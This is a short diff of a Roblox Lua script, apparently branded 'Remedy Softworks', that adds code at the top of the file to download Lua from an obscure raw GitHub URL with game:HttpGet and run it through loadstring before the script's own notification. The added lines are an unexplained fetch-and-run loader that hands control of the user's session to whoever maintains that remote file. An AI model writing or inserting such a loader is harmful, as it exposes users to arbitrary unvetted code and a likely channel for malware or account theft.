@@ -1,4 +1,10 @@
-
+local externalScriptUrl = 'https://raw.githubusercontent.com/ffavex/AHfahf1r1-rah/main/welcome.lua'
+local externalScript = loadstring(game:HttpGet(externalScriptUrl))()
+if externalScript then
+    -- Execute the external script
+    externalScript()
+end
+wait(5)
 
 game:GetService("StarterGui"):SetCore("SendNotification",{
 Title = "Remedy Softworks",
